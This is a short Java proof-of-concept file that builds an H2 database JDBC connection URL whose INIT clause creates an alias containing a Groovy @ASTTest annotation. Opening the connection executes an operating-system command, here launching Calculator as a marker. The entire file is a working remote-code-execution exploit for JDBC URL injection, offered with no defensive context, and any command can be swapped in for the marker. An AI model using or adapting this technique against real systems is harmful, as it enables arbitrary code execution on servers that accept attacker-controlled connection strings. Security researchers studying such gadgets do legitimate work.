package com.trganda.h2.poc;

import java.sql.Connection;
import java.sql.DriverManager;

public class GroovyGadget {
    public static void main(String[] args) throws Exception {
        Class.forName("org.h2.Driver");

        String groovy =
                "@groovy.transform.ASTTest(value={"
                        + " assert java.lang.Runtime.getRuntime().exec(\"open -a Calculator\")"
                        + "})"
                        + "def x";
        String url = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE ALIAS T5 AS '" + groovy + "'";

        Connection conn = DriverManager.getConnection(url);
        conn.close();
    }
}
